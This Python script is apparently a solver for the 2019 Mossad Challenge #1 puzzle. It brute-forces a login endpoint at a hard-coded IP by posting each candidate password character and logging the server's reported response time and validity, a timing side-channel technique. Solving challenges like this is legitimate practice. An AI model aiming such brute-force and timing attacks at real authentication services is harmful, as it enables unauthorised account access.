# --------------------------------------------------------
# Program by ADV-IT
#  POST Requests Brute Force for Mossad Challenge#1 2019
#
# Version      Date           Info
# 1.0          11-May-2019    Initial Version
#
# -------------------------------------------------------

import requests

CHARACTERS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|\/?,.<>`~"
URL        = "http://35.246.158.51:8070/auth/v1_1"
HEADERS    = {'User-Agent' : 'ed9ae2c0-9b15-4556-a393-23d500675d4b', 'content-type' : 'application/json; charset=utf-8' }

PAYLOAD ={}

for i in range(len(CHARACTERS)):
    PAYLOAD['Seed']     = "6711d2ec0d724396ad1570fcfb431443"
    PAYLOAD['Password'] = "" + CHARACTERS[i]

    r = requests.post(url=URL, json=PAYLOAD, headers=HEADERS)
    result = r.json()
    delay   = result['Time']
    lockurl = result['LockURL']
    isValid = result['IsValid']
    print(str(PAYLOAD) + " - " + str(delay) + " - " + str(isValid) + " -> " + str(lockurl))

